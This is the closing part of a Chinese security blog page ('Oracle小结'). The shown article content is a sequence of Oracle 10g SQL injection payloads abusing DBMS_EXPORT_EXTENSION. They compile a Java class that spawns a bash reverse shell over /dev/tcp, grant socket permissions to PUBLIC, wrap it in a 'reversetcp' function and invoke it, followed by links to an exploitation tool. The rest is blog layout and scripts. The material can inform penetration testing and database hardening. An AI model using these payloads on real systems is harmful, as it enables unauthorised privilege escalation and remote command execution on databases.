+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;shell&quot; as import java.io.*;import java.net.*;public class shell &#123;public static void run() throws Exception&#123;String[] aaa&#x3D;&#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8080;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;sh&quot;&#125;;Process p&#x3D;Runtime.getRuntime().exec(aaa);&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>授予权限</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission( &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.net.SocketPermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;*&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; );end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建函数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function reversetcp RETURN VARCHAR2 as language java name &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;shell.run() return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; &#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>赋予执行权限</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on reversetcp to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>调用</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys.reversetcp from dual</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Oracle利用工具：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vb3JhY2xlU2hlbGwlRUYlQkMlODglRTUlQTQlQTclRTQlQkQlQUMlRTUlQkElOTQlRTglQUYlQTUlRTYlOTglQUYlRTYlQjIlQTElRTYlOUMlODklRTYlOTclQjYlRTklOTclQjQlRTUlQUUlOEMlRTUlOTYlODQlRUYlQkMlODk=">https://github.com/jas502n/oracleShell（大佬应该是没有时间完善）<i class="fa fa-external-link-alt"></i></span></p>
+<p>[1] <span class="exturl" data-url="aHR0cHM6Ly9yZWRuM2NrLmdpdGh1Yi5pby8yMDE4LzA0LzI1L09yYWNsZSVFNiVCMyVBOCVFNSU4NSVBNS0lRTUlOTElQkQlRTQlQkIlQTQlRTYlODklQTclRTglQTElOEMtU2hlbGwlRTUlOEYlOEQlRTUlQkMlQjkv">https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/<i class="fa fa-external-link-alt"></i></span></p>
+<p>[2] <span class="exturl" data-url="aHR0cHM6Ly93d3cudHIweS53YW5nLzIwMTkvMDQvMTYvT3JhY2xlJUU2JUIzJUE4JUU1JTg1JUE1JUU2JThDJTg3JUU1JThDJTk3L2luZGV4Lmh0bWwjJUU2JThBJUE1JUU5JTk0JTk5JUU2JUIzJUE4JUU1JTg1JUE1">https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5<i class="fa fa-external-link-alt"></i></span></p>
+<p>[3] <span class="exturl" data-url="aHR0cDovL21lZGlhLmJsYWNraGF0LmNvbS9iaC11cy0xMC93aGl0ZXBhcGVycy9TaWRkaGFydGgvQmxhY2tIYXQtVVNBLTIwMTAtU2lkZGhhcnRoLUhhY2tpbmctT3JhY2xlLWZyb20tdGhlLVdlYi13cC5wZGY=">http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf<i class="fa fa-external-link-alt"></i></span></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>oudeniu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://butnomingzi.github.io/posts/bb8356a5/" title="Oracle小结">https://butnomingzi.github.io/posts/bb8356a5/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"><i class="fa fa-tag"></i> 命令执行</a>
+              <a href="/tags/ORACLE/" rel="tag"><i class="fa fa-tag"></i> ORACLE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/6e52a8fb/" rel="prev" title="sqlmap关于MSSQL执行命令思考">
+      <i class="fa fa-chevron-left"></i> sqlmap关于MSSQL执行命令思考
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/2c0d0e17/" rel="next" title="Hexo记录">
+      Hexo记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E6%9E%84%E5%BB%BA"><span class="nav-number">1.2.</span> <span class="nav-text">注入点构建</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="nav-number">2.1.</span> <span class="nav-text">基本语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%A1%A8"><span class="nav-number">2.2.</span> <span class="nav-text">系统表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="nav-number">2.3.</span> <span class="nav-text">获取数据库信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="nav-number">2.4.</span> <span class="nav-text">获取用户信息</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oracle%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">Oracle注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.2.</span> <span class="nav-text">盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OOB%E5%A4%96%E5%B8%A6"><span class="nav-number">3.3.</span> <span class="nav-text">OOB外带</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oracle11g-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.</span> <span class="nav-text">Oracle11g 命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dbms-xmlquery-newcontext"><span class="nav-number">4.1.</span> <span class="nav-text">dbms_xmlquery.newcontext</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DBMS-JAVA-TEST-FUNCALL"><span class="nav-number">4.2.</span> <span class="nav-text">DBMS_JAVA_TEST.FUNCALL()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DBMS-JAVA-RUNJAVA"><span class="nav-number">4.3.</span> <span class="nav-text">DBMS_JAVA.RUNJAVA()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DBMS-REPCAT-RPC-VALIDATE-REMOTE-RC"><span class="nav-number">4.4.</span> <span class="nav-text">DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="nav-number">4.5.</span> <span class="nav-text">另外一种方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oracle-10g-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">5.</span> <span class="nav-text">Oracle 10g 命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DBMS-EXPORT-EXTENSION"><span class="nav-number">5.1.</span> <span class="nav-text">DBMS_EXPORT_EXTENSION</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dbms-xmlquery-newcontext-1"><span class="nav-number">5.2.</span> <span class="nav-text">dbms_xmlquery.newcontext</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">5.3.</span> <span class="nav-text">Linux反弹shell</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">oudeniu</p>
+  <div class="site-description" itemprop="description">一点都对，半点都没错。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy8=" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;potatsoSec&#x2F;">宽字节安全</span>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+      <div id="music163player">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=420 src="//music.163.com/outchain/player?type=0&id=5008808022&auto=1&height=430"></iframe>
+      </div>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">oudeniu</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">202k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:04</span>
+</div>
+    <!-- 网站运行时间的设置 -->
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>  
+    <script>
+        var now = new Date();
+        function createtime() {
+            var grt= new Date("03/03/2020 13:14:21");//此处修改你的建站时间或者网站上线时间
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+            document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+            document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        }
+    setInterval("createtime()",250);
+    </script>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/6.3.3/firebase-firestore.js"></script>
+  <script>
+    firebase.initializeApp({
+      apiKey   : '',
+      projectId: ''
+    });
+
+    function getCount(doc, increaseCount) {
+      // IncreaseCount will be false when not in article page
+      return doc.get().then(d => {
+        var count = 0;
+        if (!d.exists) { // Has no data, initialize count
+          if (increaseCount) {
+            doc.set({
+              count: 1
+            });
+            count = 1;
+          }
+        } else { // Has data
+          count = d.data().count;
+          if (increaseCount) {
+            // If first view this article
+            doc.set({ // Increase count
+              count: count + 1
+            });
+            count++;
+          }
+        }
+
+        return count;
+      });
+    }
+
+    function appendCountTo(el) {
+      return count => {
+        el.innerText = count;
+      }
+    }
+  </script>
+  <script data-pjax>
+    (function() {
+      var db = firebase.firestore();
+      var articles = db.collection('articles');
+
+      if (CONFIG.page.isPost) { // Is article page
+        var title = document.querySelector('.post-title').innerText.trim();
+        var doc = articles.doc(title);
+        var increaseCount = CONFIG.hostname === location.hostname;
+        if (localStorage.getItem(title)) {
+          increaseCount = false;
+        } else {
+          // Mark as visited
+          localStorage.setItem(title, true);
+        }
+        getCount(doc, increaseCount).then(appendCountTo(document.querySelector('.firestore-visitors-count')));
+      } else if (CONFIG.page.isHome) { // Is index page
+        var promises = [...document.querySelectorAll('.post-title')].map(element => {
+          var title = element.innerText.trim();
+          var doc = articles.doc(title);
+          return getCount(doc);
+        });
+        Promise.all(promises).then(counts => {
+          var metas = document.querySelectorAll('.firestore-visitors-count');
+          counts.forEach((val, idx) => {
+            appendCountTo(metas[idx])(val);
+          });
+        });
+      }
+    })();
+  </script>
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"}});</script></body>
+</html>
